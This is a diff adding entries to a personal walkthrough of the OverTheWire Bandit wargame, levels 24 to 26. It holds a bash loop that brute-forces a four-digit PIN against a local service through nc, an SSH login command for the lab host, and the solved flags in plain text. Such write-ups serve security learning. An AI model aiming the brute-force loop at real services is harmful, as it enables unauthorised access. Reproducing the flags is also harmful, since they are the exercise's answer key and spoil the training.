@@ -306,3 +306,22 @@ cat /etc/bandit_pass/bandit24 > /tmp/champs/password
 continuosly cat the password file
 
 flag: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+Level 25
+Create script on tmp file
+
+#!/bin/bash                                                                 
+bandit24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+for pin in {0000..9999}; do
+  echo $bandit24 $pin
+done | nc localhost 30002
+
+flag: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Level 26:
+
+ssh -t -l bandit26 -p 2220 -i bandit25 bandit.labs.overthewire.org /bin/sh
+
+resize the terminal.
+
+flag:5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
